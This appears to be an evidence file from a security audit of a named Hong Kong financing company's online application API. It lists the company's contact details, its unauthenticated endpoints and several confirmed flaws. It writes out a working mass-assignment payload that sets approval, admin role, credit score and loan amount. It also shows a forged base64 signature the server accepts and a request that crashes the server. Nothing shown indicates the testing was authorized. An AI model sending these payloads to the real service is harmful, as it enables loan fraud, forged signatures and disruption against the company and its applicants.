@@ -1,0 +1,55 @@
+=== EVIDENCE: royal-venture.com API Security Audit ===
+
+## 1. Company Info (exposed in client-side JS)
+- Company: 皇家創富集團有限公司 (Royal Venture Group Limited)
+- License: 573/2026
+- Address: UNIT 1207, 12/F, The Belgian Bank Building, Nos. 721, 723 & 725 Nathan Road, Kowloon
+- Tel: (852) 6956 8727
+- Email: info@royal-venture.com
+- Website: www.royal-venture.com
+
+## 2. Unauthenticated API Endpoints (online.royal-venture.com)
+- POST /api/applications/submit — create draft, returns draftToken
+- PATCH /api/applications/draft — update draft step (token in body)
+- POST /api/applications/signatures — submit signatures (token in body)
+- GET /api/settings?key=<key> — unauthenticated key-value settings lookup
+- POST /api/auth/login — login endpoint (same as internal panel)
+- POST /api/auth/logout — logout endpoint (returns {"ok":true} without auth)
+
+## 3. Confirmed Vulnerabilities ===
+
+### 3.1 Mass Assignment (CRITICAL)
+PATCH /api/applications/draft accepts arbitrary JSON fields in `data` object.
+No field filtering. Injected fields accepted: approved, status, adminOverride,
+isAdmin, role, userLevel, riskScore, creditScore, approvalAmount, finalAmount,
+interestRate, interestRateOverridden, processingFee, feeWaived, bypassCreditCheck,
+manualReview, reviewStatus, reviewer, internalNote.
+
+Example - PATCH step 2 response: {"ok":true}
+with injected data: {"surname":"test","phone":"91234567","gender":"男","approved":true,"status":"approved","adminOverride":true,"isAdmin":true,"role":"admin","creditScore":999,"approvalAmount":999999999,"bypassCreditCheck":true,"reviewStatus":"approved"}
+
+### 3.2 Signature Forgery (HIGH)
+POST /api/applications/signatures accepts arbitrary base64-encoded data as signatures.
+No signature verification. HKID validation only checks format (A123456(3)).
+Forged signature: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJ"
+Response: {"ok":true}
+
+### 3.3 Type Confusion / DoS (MEDIUM)
+POST /api/applications/submit with amount as number (not string) causes:
+  {"ok":false,"error":"Internal server error"}
+Server crashes on type mismatch - potential DoS.
+
+### 3.4 Unauthenticated Settings API (LOW)
+GET /api/settings returns all settings without authentication.
+Only whatsapp_phone exposed, but endpoint allows key enumeration.
+No SQL injection found (all injection payloads return "Not found").
+
+### 3.5 Unauthenticated Admin Endpoints (MEDIUM)
+POST /api/auth/logout returns {"ok":true} without authentication.
+/api/profile returns 401 Unauthorized (requires auth) on both panels.
+
+### 3.6 Rate Limiting (MEDIUM - Bypass noted)
+Login: 5 attempts → 15 minute lockout (IP-based).
+Submit: IP-based rate limiting (multiple requests trigger 429 Too Many Requests).
+
+=== END EVIDENCE ===
